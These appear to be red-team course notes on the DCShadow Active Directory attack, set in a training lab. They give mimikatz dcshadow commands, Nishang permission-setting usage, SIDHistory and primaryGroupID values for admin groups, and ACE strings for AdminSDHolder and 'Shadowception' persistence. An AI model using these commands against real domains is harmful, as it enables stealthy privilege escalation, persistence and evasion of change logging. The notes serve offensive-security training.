
# DCShadow

• DCShadow temporarily registers a new domain controller in the target domain and uses it to "push" attributes like SIDHistory, SPNs etc) on specified objects without leaving the change logs for modified object

• The new domain controller is registered by modifying the Configuration container, SPNs of an existing computer object and couple of RPC services. 

• Because the attributes are changed from a "domain controller", there are no directory change logs on the actual DC for the target object. 

• By default, DA privileges are required to use DCShadow. 

• In my experiments, the attacker's machine must be part of the root domain.

## We can use mimikatz for DCShadow

Two mimikatz instances are required: 

• One to start RPC servers with SYSTEM privileges and specify attributes to be modified:
```cmd
!+ 
!processtoken
lsadump::dcshadow /object:root1user /attribute:Description /value="Hello from DCShadow" 
```

• And second with enough privileges (DA or otherwise) to push the values. 
```cmd
lsadump::dcshadow /push
```

• DCShadow can be used with minimal permissions by modifying ACLs of -

– The domain object.
	• DS-Install-Replica (Add/Remove Replica in Domain) 
	• DS-Replication-Manage-Topology (Manage Replication Topology) 
	• DS-Replication-Synchronize (Replication Synchornization)
	
– The Sites object (and its children) in the Configuration container. 
	• CreateChild and DeleteChild 
	
– The object of the computer which is registered as a DC. 
	• WriteProperty (Not Write) 

– The target object. 
	• WriteProperty (Not Write) 

• We can use `Set-DCShadowPermissions` from Nishang for setting the permissions.

## DCShadow - Minimal Permissions

• We can use `Set-DCShadowPermissions` from Nishang for setting the permissions.

• For example, to use DCShadow as user student1 to modify root1user object from machine `mcorp-student1`: 
```powershell 
Set-DCShadowPermissions -FakeDC mcorp-student1 - SAMAccountName root1user -Username student1 -Verbose 
```

• Now, the second mimkatz instance (which runs as DA) is not required.

#### Set SIDHistory of a user account to Enterprise Admins or Domain Admins group: 
```powershell
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-5- 21-280534878-1496970234-700767426-519 

# To use above without DA: 
Set-DCShadowPermissions -FakeDC mcorp-student1 -SAMAccountName root1user -Username student1 -Verbose
```

#### Set primaryGroupID of a user account to Enterprise Admins or Domain Admins group: 
```powershell
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

#### Modify ntSecurityDescriptor for AdminSDHolder to add Full Control for a user 
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
```

#### Append a Full Control ACE from above for SY/BA/DA with our user's SID at the end. 
```powershell
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<modified ACL>
```

#### We can even run DCShadow from DCShadow which I have named Shadowception:
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
```

#### We need to append following ACEs with our user's SID at the end: 

• On the domain object: 
```
(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)
(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID) 
(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID) 
```

• On the attacker computer object: `(A;;WP;;;UserSID)`
• On the target user object: `(A;;WP;;;UserSID)`
• On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`

# Shadowception

• If we maintain access to the computer for which we modified the permissions with the user whose SID we added, we can modify the attributes of the specific user whose permissions we modified. 

• Let's see how we can modify properties of root13user from mcorpstudent13 machine as student13 using DCShadow.

# Learning Objective 23

• Use DCShadow to set a SPN for rootxuser. 

• Using DCShadow, set rootxuser's SIDHistory without using DA. 

• Modify the permissions of AdminSDHolder container using DCShadow and add Full Control permission for studentx.